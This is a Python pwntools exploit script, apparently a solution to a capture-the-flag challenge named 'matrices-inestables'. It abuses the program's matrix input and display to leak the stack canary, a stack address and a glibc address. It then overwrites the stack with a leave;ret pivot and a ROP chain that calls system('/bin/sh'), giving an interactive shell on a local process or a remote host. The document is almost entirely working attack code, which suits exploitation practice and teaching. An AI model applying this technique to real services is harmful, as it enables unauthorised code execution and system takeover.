#/usr/bin/env python3

import ast

from pwn import context, ELF, ROP, p64, remote, sys, u64


context.binary = 'matrices-inestables'
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


def send_matrix_A():
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Ingrese filas y columnas de la matriz (separados por espacio): ', f'{len(A) - 1} {len(A[0]) - 1}'.encode())
    io.sendlineafter(b'Introduce los valores para la matriz: ', str(A).encode())


def send_matrix_B():
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Ingrese filas y columnas de la matriz (separados por espacio): ', f'{len(B) - 1} {len(B[0]) - 1}'.encode())
    io.sendlineafter(b'Introduce los valores para la matriz: ', str(B).encode())


def multiply():
    io.sendlineafter(b'> ', b'3')
    

def show() -> list[list[int]]:
    io.sendlineafter(b'> ', b'4')
    return ast.literal_eval(io.recvlineS())
    
    
io = get_process()

A, B = ([[0] * 17 for _ in range(17)] for _ in range(2))
B[-1][8] = B[-1][12] = 0x1f

send_matrix_A()
send_matrix_B()

C = show()

canary = u64(bytes(C[16][:8]))
stack_addr = u64(bytes(C[16][8:16]))
__libc_start_main_addr = u64(bytes(C[17][:8])) + 0x36

io.info(f'Canary: {hex(canary)}')
io.info(f'Stack address: {hex(stack_addr)}')
io.info(f'__libc_start_main address: {hex(__libc_start_main_addr)}')

glibc.address = __libc_start_main_addr - glibc.sym.__libc_start_main
io.success(f'Glibc base address: {hex(glibc.address)}')

rop = ROP(glibc)

A[-1][0] = 1

B[0][0:16] = list(p64(canary) + p64(stack_addr - 0x228))
B[1][0] = 0xc4

B[1][8:16] = list(p64(rop.find_gadget(['leave', 'ret']).address))  # -> stack_addr - 0x228

B[9][8:16] = list(p64(rop.rdi.address))
B[10][0:8] = list(p64(next(glibc.search(b'/bin/sh'))))
B[10][8:16] = list(p64(glibc.sym.system))

send_matrix_A()
send_matrix_B()

multiply()
io.sendlineafter(b'> ', b'0')

io.interactive()
